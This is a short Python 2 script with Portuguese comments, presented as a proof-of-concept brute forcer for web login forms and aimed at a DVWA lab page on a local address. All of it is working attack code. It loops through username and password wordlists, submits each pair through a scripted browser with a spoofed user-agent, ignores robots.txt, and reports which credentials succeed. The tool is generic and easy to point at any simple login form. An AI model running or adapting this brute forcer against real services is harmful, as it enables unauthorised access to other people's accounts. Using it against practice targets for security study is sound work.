#!-*- coding: utf8 -*-
#
# PoC - Brute forcer "quick and dirty" para em formularios web.
# Versao: 1.0 - 24/Out/2012
#
# Daniel Marques - daniel /arroba\ codalabs /ponto\ net
# http://codalabs.net
#
# Changelog
# v1.0 ~> Versão inicial. Comportamento do browser baseado no código de \
#	  Rogério Carvalho Schneider (http://stockrt.github.com)

import mechanize


# Parâmetros do formulário
url = 'http://192.168.1.5/dvwa/login.php' #URL que recebe os parâmetros para processamento
formUser = 'username' # Parâmetro do fomrulário que armazena o username.
formPasswd = 'password' # Parâmetro do formulário que armazena a senha.
formID = 0 # Identificação do formulário.

# Listas de usuários e senhas
users = open("usuarios.txt","r")

# Criando um browser
br = mechanize.Browser()

# Opções do browser
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Definindo User-agent
br.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0')]
print "[*] Iniciando brute force...\n"

autenticado = False

usuario = users.readline()

while usuario:

	wordlist = open("senhas.txt","r")
	senha = wordlist.readline() 	
	while ( not autenticado ) and senha:
		req = br.open(url)

		# Preenchimento do formulário.
		br.select_form(nr=formID) 
		br.form[formUser] = str(usuario).rstrip('\n')
		br.form[formPasswd] = str(senha).rstrip('\n')
		br.submit()		

		#Tratamento da resposta
		html=br.response().read()

		if "Welcome" in html:
			print "[-] [AUTENTICADO] " + str(usuario).rstrip('\n') + " - Senha: " + str(senha).rstrip('\n')
			autenticado = True
			br.follow_link(text='Logout')
		else:
			print "[-] [FALHOU] " + str(usuario).rstrip('\n') + " - Senha: " + str(senha).rstrip('\n')

		senha = wordlist.readline() 

	wordlist.close()
	usuario = users.readline()

users.close()
print "\n[-] Finalizado.\n"
